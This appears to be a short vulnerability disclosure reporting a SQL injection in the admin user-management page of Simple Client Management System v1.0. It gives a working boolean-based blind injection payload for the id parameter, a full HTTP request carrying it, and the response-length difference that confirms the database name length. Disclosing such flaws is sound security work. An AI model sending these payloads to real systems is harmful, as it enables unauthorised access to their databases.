# Simple-Client-Management-System v1.0 by oretnom23 has SQL injection

**Author：** k0xx

vendors: https://www.sourcecodester.com/php/15027/simple-client-management-system-php-source-code.html

Vulnerability File: /cms/admin/?page=user/manage_user&id=

Vulnerability location: /cms/admin/?page=user/manage_user&id=,id

[+] Payload: /cms/admin/?page=user/manage_user&id=11%27%20and%20length(database())%20=6%20--+  // Leak place ---> id

Current database name: cms_db,length is 6

```sql
GET /cms/admin/?page=user/manage_user&id=11%27%20and%20length(database())%20=6%20--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=3m0l1n81dvmlo0a3h9oo72q1gp
Connection: close

// Leak place ---> id
```

When length (database ()) = 6, Content-Length: 24963
![image](https://user-images.githubusercontent.com/54017627/164883475-57f83038-d3f0-40ca-94de-647333d31543.png)


When length (database ()) = 7, Content-Length: 25112
![image](https://user-images.githubusercontent.com/54017627/164883482-7cea1ca4-106b-4b81-9dff-e754e0da5877.png)

